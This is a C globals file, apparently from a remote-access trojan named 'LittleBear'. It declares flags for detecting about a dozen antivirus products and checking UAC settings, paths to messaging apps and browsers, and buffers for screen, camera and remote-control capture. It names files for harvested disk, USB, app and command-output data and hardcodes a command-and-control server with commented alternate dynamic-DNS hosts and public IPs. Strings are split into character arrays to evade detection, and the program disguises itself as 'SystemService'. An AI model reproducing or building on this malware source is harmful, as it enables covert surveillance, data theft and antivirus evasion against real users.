#include "public.h"

#include <windows.h>


int iIsProcessAdmin = 0;
int iIsUserAdmin = 0;
int iSystemVersion = 0;
char strSysVersion[32] = { 0 };
int iCpuBits = 0;
char strDataPath[MAX_PATH] = { 0 };

char strPEResidence[MAX_PATH] = { 0 };

char strLocalMac[32] = { 0 };
unsigned char cMAC[6] = { 0 };
char strGateWayMac[32] = { 0 };
char strLocalIP[32] = { 0 };
char strExternalIP[64] = { 0 };
char strGateWayIP[32] = { 0 };
unsigned long ulVolumeSerialNo = 0;
char szHDModelNumber[64] = { 0 };
char szHDSerialNumber[64] = { 0 };
char strHostName[64] = { 0 };
char strComputerName[64] = { 0 };
char strUserName[64] = { 0 };
char szParentProcName[MAX_PATH] = { 0 };
char szSysDir[MAX_PATH] = { 0 };
HANDLE gMutex = 0;
char gLocation[256] = { 0 };
char gNetworkType[256] = { 0 };

int iIsAdministrator = 0;
BOOL iEnableLUA = FALSE;
BOOL iPromptOnSecureDesktop = FALSE;
BOOL iConsentPromptBehaviorAdmin = FALSE;

BOOL b360Running = 0;
BOOL bAvgntRunning = 0;
DWORD bAvastRunning = 0;
DWORD bComodoRunning = 0;
DWORD bJinshanRunning = 0;
DWORD bDubaRunning = 0;

DWORD bQAXSafeRunning = 0;

DWORD bNortonRunning = 0;
DWORD bRuixingRunning = 0;
DWORD bKasperskyRunning = 0;
DWORD bBaiduAntiRunning = 0;
DWORD bQQPCTrayRunning = 0;

DWORD bMsMpEng = 0;

BOOL bQQExist = 0;
DWORD bSkypeExist = 0;
DWORD bAliwangwangExist = 0;
DWORD bWechatExist = 0;


char strQQPath[MAX_PATH] = { 0 };
char szIEPath[MAX_PATH] = { 0 };
char szChromePath[MAX_PATH] = { 0 };
char szFireFoxPath[MAX_PATH] = { 0 };
char szWechatPath[MAX_PATH] = { 0 };
char szSkypePath[MAX_PATH] = { 0 };
char szAliwangwangPath[MAX_PATH] = { 0 };

int JPG_STREAM_SIZE = 0;
INT REMOTECONTROL_BUFFER_SIZE = 0;
int BMP_STREAM_SIZE = 0;
int ScrnResolutionX = 0;
int ScrnResolutionY = 0;

DWORDLONG dwTotalMemory = 0;
DWORDLONG dwAvilableMem = 0;
DWORD dwCpuCnt = 0;
DWORD dwMemPageSize = 0;
char cCryptKey[32] = { 0 };

//googfun888.servequake.com
char SERVER_IP_ADDRESS[64] = "192.168.101.122";			//zozotown2304.ufcfan.org  45.207.44.139	192.168.101.122		47.101.204.4
char gUserName[64] = "test";
DWORD gServerIP = 0;

char  CONFIG_FILENAME[] = { 'c','o','n','f','i','g','.','d','a','t',0 };

char  LITTLEBEAR_LOG_FILE_NAME[] = { 'S','y','s','t','e','m','S','e','r','v','i','c','e','_','L','o','g','.','t','x','t',0 };

char  LITTLEBEARNAME[] = { 'S','y','s','t','e','m','S','e','r','v','i','c','e',0 };

char LITTLEBEAR_MUTEX_NAME[] = { 'g','l','o','b','a','l','_', 'L','I','T','T','L','E','B','E','A','R','_','M','U','T','E','X',0 };

char  CAMERA_CAPTURE_NAME[] = { 'L','I','T','T','L','E','B','E','A','R','_','C','A','M','E','R','A','_','C','A','P','T','U','R','E',0 };

char  ALL_DISK_FILE_FILENAME[] = { 'a','l','l','_','d','i','s','k','_','f','i','l','e','.','t','x','t',0 };

char  USB_DISK_FILE_FILENAME[] = { 'u','s','b','_','d','i','s','k','_','f','i','l','e','.','t','x','t',0 };

char  MACHINE_INFO_FILENAME[] = { 'd','e','v','i','c','e','i','n','f','o','.','j','s','o','n',0 };

char  INSTALLAPPS_FILENAME[] = { 'i','n','s','t','a','l','l','_','a','p','p','s','_','f','i','l','e','.','j','s','o','n',0 };

char  RUNNINGAPPS_FILENAME[] = { 'r','u','n','n','i','n','g','_','a','p','p','s','_','f','i','l','e','.','j','s','o','n',0 };

char  TASKS_XML_FILE_NAME[] = { 't','a','s','k','_','x','m','l','_','f','i','l','e','.','t','x','t',0 };

char  CMD_OUTPUT_FILE_NAME[] = { 'c','m','d','_','o','u','t','p','u','t','_','f','i','l','e','.','t','x','t',0 };